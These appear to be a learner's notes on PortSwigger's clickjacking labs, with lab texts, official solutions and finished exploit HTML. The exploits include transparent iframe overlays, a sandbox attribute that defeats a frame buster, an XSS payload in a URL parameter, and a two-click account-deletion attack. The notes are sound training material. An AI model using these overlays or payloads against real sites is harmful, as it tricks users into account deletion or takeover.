## **Clickjacking**

https://portswigger.net/web-security/clickjacking



#### Basic clickjacking with CSRF token protection

> This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.
>
> To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.
>
> You can log in to your own account using the following credentials: wiener:peter 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Log in to your account on the target website.
                    </li>
                    <li>
                        <p>
                            Go to the exploit server and paste the following HTML template into the <strong>Body</strong> section:
                        </p>
                        <code class="code-scrollable">&lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe src="$url"&gt;&lt;/iframe&gt;</code>
                    </li>
                    <li>
                        Make the following adjustments to the template:
                        <ul>
                            <li>
                                Replace <code>$url</code> in the iframe <code>src</code> attribute with the URL for the target website's user account page.
                            </li>
                            <li>
                                Substitute suitable pixel values for the <code>$height_value</code> and <code>$width_value</code> variables of the iframe (we suggest 700px and 500px respectively).
                            </li>
                            <li>
                                Substitute suitable pixel values for the <code>$top_value</code> and <code>$side_value</code> variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).
                            </li>
                            <li>
                                Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
                            </li>
                        </ul>
                    </li>
                    <li>
                        Click <strong>Store</strong> and then <strong>View exploit</strong>.
                    </li>
                    <li>
                        Hover over <strong>Test me</strong> and ensure the cursor changes to a hand indicating that the div element is positioned correctly. <strong>Do not actually click the "Delete account" button yourself.</strong> If you do, the lab will be broken and you will need to wait until it resets to try again (about 20 minutes). If the div does not line up properly, adjust the <code>top</code> and <code>left</code> properties of the style sheet.
                    </li>
                    <li>
                        Once you have the div element lined up correctly, change "Test me" to "Click me" and click <strong>Store</strong>.
                    </li>
                    <li>
                        Click on <strong>Deliver exploit to victim</strong> and the lab should be solved.
                    </li>
                </ol>
            </div>
        </div>

exploit

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:300px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a77008a03ad391cc0f93551005400ae.web-security-academy.net/my-account"></iframe>
```

[How to construct a basic clickjacking attack](https://portswigger.net/web-security/clickjacking#how-to-construct-a-basic-clickjacking-attack)

```html
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```



#### Clickjacking with form input data prefilled from a URL parameter

> This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
>
> To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.
>
> You can log in to your own account using the following credentials: wiener:peter 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Log in to the account on the target website.
                    </li>
                    <li>
                        <p>
                            Go to the exploit server and paste the following HTML template into the "Body" section:
                        </p>
                        <code class="code-scrollable">&lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe src="$url?email=hacker@attacker-website.com"&gt;&lt;/iframe&gt;</code>
                    </li>
                    <li>
                        Make the following adjustments to the template:
                        <ul>
                            <li>
                                Replace $url with the URL of the target website's user account page, which contains the "Update email" form.
                            </li>
                            <li>
                                Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).
                            </li>
                            <li>
                                Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Update email" button and the "Test me" decoy action align (we suggest 400px and 80px respectively).
                            </li>
                            <li>
                                Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
                            </li>
                        </ul>
                    </li>
                    <li>
                        Click <strong>Store</strong> and then <strong>View exploit</strong>.
                    </li>
                    <li>
                        Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.
                    </li>
                    <li>
                        Once you have the div element lined up correctly, change "Test me" to "Click me" and click <strong>Store</strong>.
                    </li>
                    <li>
                        Now click on <strong>Deliver exploit to victim</strong> and the lab should be solved.
                    </li>
                </ol>
            </div>
        </div>

exploit

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:425px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a49000903337674c047132a00870052.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```



#### Clickjacking with a frame buster script

> This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?
>
> To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.
>
> You can log in to your own account using the following credentials: wiener:peter 

buster script

```javascript
<script>
    if(top != self) {
        window.addEventListener("DOMContentLoaded", function() { 
            document.body.innerHTML = 'This page cannot be framed';}, false);
    }
</script>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Log in to the account on the target website.
                    </li>
                    <li>
                        <p>
                            Go to the exploit server and paste the following HTML template into the "Body" section:
                        </p>
                        <code class="code-scrollable">&lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe sandbox="allow-forms"
src="$url?email=hacker@attacker-website.com"&gt;&lt;/iframe&gt;</code>
                    </li>
                    <li>
                        Make the following adjustments to the template:
                        <ul>
                            <li>
                                Replace <code>$url</code> in the iframe <code>src</code> attribute with the URL of the target website's user account page, which contains the "Update email" form.
                            </li>
                            <li>
                                Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).
                            </li>
                            <li>
                                Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Update email" button and the "Test me" decoy action align (we suggest 385px and 80px respectively).
                            </li>
                            <li>
                                Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
                            </li>
                        </ul>
                        Notice the use of the <code>sandbox="allow-forms"</code> attribute that neutralizes the frame buster script.
                    </li>
                    <li>
                        Click <strong>Store</strong> and then <strong>View exploit</strong>.
                    </li>
                    <li>
                        Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.
                    </li>
                    <li>
                        Once you have the div element lined up correctly, change "Test me" to "Click me" and click <strong>Store</strong>.
                    </li>
                    <li>
                        Now click on <strong>Deliver exploit to victim</strong> and the lab should be solved.
                    </li>
                </ol>
            </div>
        </div>

exploit

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:435px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a3b009d04b07373c0d3b24900db0022.web-security-academy.net/my-account?email=hacker@attacker-website.com" sandbox="allow-forms"></iframe>
```



#### Exploiting clickjacking vulnerability to trigger DOM-based XSS

> This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function. 

submitFeedback.js

```javascript
document.getElementById("feedbackForm").addEventListener("submit", function(e) {
    submitFeedback(this.getAttribute("method"), this.getAttribute("action"), this.getAttribute("enctype"), this.getAttribute("personal"), new FormData(this));
    e.preventDefault();
});

function submitFeedback(method, path, encoding, personal, data) {
    var XHR = new XMLHttpRequest();
    XHR.open(method, path);
    if (personal) {
        XHR.addEventListener("load", displayFeedbackMessage(data.get('name')));
    } else {
        XHR.addEventListener("load", displayFeedbackMessage());
    }
    if (encoding === "multipart/form-data") {
        XHR.send(data)
    } else {
        var params = new URLSearchParams(data);
        XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        XHR.send(params.toString())
    }
}

function displayFeedbackMessage(name) {
    return function() {
        var feedbackResult = document.getElementById("feedbackResult");
        if (this.status === 200) {
            feedbackResult.innerHTML = "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
            feedbackForm.reset();
        } else {
            feedbackResult.innerHTML =  "Failed to submit feedback: " + this.responseText
        }
    }
}
```

Trigger XSS

```html
<form id="feedbackForm" action="/feedback/submit" method="POST" enctype="application/x-www-form-urlencoded" personal="true">
                        <input required="" type="hidden" name="csrf" value="co8ZpCmZID7ki9InG5eRm5xXc1I1Fhik">
                        <label>Name:</label>
                        <input required="" type="text" name="name" value="<img src=&quot;1&quot; onerror=&quot;alert(1)&quot;>">
                        <label>Email:</label>
                        <input required="" type="email" name="email" value="111@test.com">
                        <label>Subject:</label>
                        <input required="" type="text" name="subject" value="1">
                        <label>Message:</label>
                        <textarea required="" rows="12" cols="300" name="message">1</textarea>
                        <button class="button" type="submit">
                            Submit feedback
                        </button>
                        <span id="feedbackResult">Thank you for submitting feedback, <img src="1" onerror="alert(1)">!</span>
                    </form>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
					<li>
						<p>
							Go to the exploit server and paste the following HTML template into the <strong>Body</strong> section:
						</p>
						<code class="code-scrollable">&lt;style&gt;
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe
src="$url?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult"&gt;&lt;/iframe&gt;</code>
					</li>
					<li>
						Make the following adjustments to the template:
						<ul>
							<li>
								Replace <code>$url</code> in the iframe <code>src</code> attribute with the URL for the target website's "Submit feedback" page.
							</li>
							<li>
								Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).
							</li>
							<li>
								Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Submit feedback" button and the "Test me" decoy action align (we suggest 610px and 80px respectively).
							</li>
							<li>
								Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
							</li>
						</ul>
					</li>
					<li>
						Click <strong>Store</strong> and then <strong>View exploit</strong>.
					</li>
					<li>
						Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.
					</li>
					<li>
						Click <strong>Test me</strong>. The print dialog should open.
					</li>
					<li>
						Change "Test me" to "Click me" and click <strong>Store</strong> on the exploit server.
					</li>
					<li>
						Now click on <strong>Deliver exploit to victim</strong> and the lab should be solved.
					</li>
				</ol>
            </div>
        </div>

exploit

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:418px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0ae5001b04067057c0830a1e00020071.web-security-academy.net/feedback?name=%3Cimg%20src=%221%22%20onerror=%22print()%22%3E&email=111%40test.com&subject=1&message=1#feedbackResult"></iframe>
```



#### Multistep clickjacking

> This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.
>
> You can log in to the account yourself using the following credentials: wiener:peter 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
				<ol>
					<li>
						Log in to your account on the target website and go to the user account page.
					</li>
					<li>
						<p>
							Go to the exploit server and paste the following HTML template into the "Body" section:
						</p>
						<code class="code-scrollable">&lt;style&gt;
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
&nbsp; &nbsp;.firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
&nbsp; &nbsp;.secondClick {
		top:$top_value2;
		left:$side_value2;
	}
&lt;/style&gt;
&lt;div class="firstClick"&gt;Test me first&lt;/div&gt;
&lt;div class="secondClick"&gt;Test me next&lt;/div&gt;
&lt;iframe src="$url"&gt;&lt;/iframe&gt;</code>
					</li>
					<li>
						Make the following adjustments to the template:
						<ul>
							<li>
								Replace $url with the URL for the target website's user account page.
							</li>
							<li>
								Substitute suitable pixel values for the $width_value and $height_value variables of the iframe (we suggest 500px and 700px respectively).
							</li>
							<li>
								Substitute suitable pixel values for the $top_value1 and $side_value1 variables of the decoy web content so that the "Delete account" button and the "Test me first" decoy action align (we suggest 330px and 50px respectively).
							</li>
							<li>
								Substitute a suitable value for the $top_value2 and $side_value2 variables so that the "Test me next" decoy action aligns with the "Yes" button on the confirmation page (we suggest 285px and 225px respectively).
							</li>
							<li>
								Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
							</li>
						</ul>
					</li>
					<li>
						Click <strong>Store</strong> and then <strong>View exploit</strong>.
					</li>
					<li>
						Hover over "Test me first" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the <code>firstClick</code> class of the style sheet.
					</li>
					<li>
						Click <strong>Test me first</strong> then hover over <strong>Test me next</strong> and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the <code>secondClick</code> class of the style sheet.
					</li>
					<li>
						Once you have the div element lined up correctly, change "Test me first" to "Click me first", "Test me next" to "Click me next" and click <strong>Store</strong> on the exploit server.
					</li>
					<li>
						Now click on <strong>Deliver exploit to victim</strong> and the lab should be solved.
					</li>
				</ol>
            </div>
        </div>

exploit

```html
<style>
	iframe {
		position:relative;
		width:700px;
		height: 500px;
		opacity: 0.1;
		z-index: 2;
	}
    .firstClick, .secondClick {
		position:absolute;
		top:435px;
		left:50px;
		z-index: 1;
	}
    .secondClick {
		top:300px;
		left:210px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a3400bb031cd39dc0c806b3003a00d2.web-security-academy.net/my-account#delete-account-form"></iframe>
```

